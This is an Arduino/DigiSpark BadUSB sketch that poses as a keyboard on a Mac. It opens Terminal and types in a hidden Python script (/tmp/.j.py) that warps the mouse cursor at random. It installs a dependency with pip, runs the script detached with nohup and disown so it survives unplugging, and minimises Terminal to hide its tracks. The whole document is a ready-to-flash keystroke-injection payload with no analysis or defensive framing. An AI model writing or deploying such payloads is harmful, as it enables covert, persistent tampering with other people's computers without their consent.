#include <DigiKeyboard.h>
#include <avr/pgmspace.h>

void ptype(const char* s){char c;while((c=pgm_read_byte(s++))){DigiKeyboard.print(c);delay(8);}}
void pln(const char* s){ptype(s);DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.delay(50);}

void setup() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0x2C, MOD_GUI_LEFT);
  DigiKeyboard.delay(1200);
  ptype(PSTR("Terminal"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);

  // Plugged in (DigiSpark vendor ID 5840): jiggle every 3s — obvious
  // Unplugged: teleport every 2 min — subtle
  pln(PSTR("cat>/tmp/.j.py<<'E'"));
  DigiKeyboard.delay(300);
  pln(PSTR("import subprocess,time,random"));
  pln(PSTR("from Quartz import CGWarpMouseCursorPosition"));
  pln(PSTR("def p():"));
  pln(PSTR(" r=subprocess.run(['hidutil','list'],capture_output=1,text=1,timeout=2)"));
  pln(PSTR(" return '0x16C0' in r.stdout"));
  pln(PSTR("while 1:"));
  pln(PSTR(" time.sleep(3 if p() else 120)"));
  pln(PSTR(" CGWarpMouseCursorPosition((random.randint(0,2560),random.randint(0,1600)))"));
  pln(PSTR("E"));
  DigiKeyboard.delay(500);
  pln(PSTR("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.j.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'"));
}
void loop(){DigiKeyboard.delay(1);}
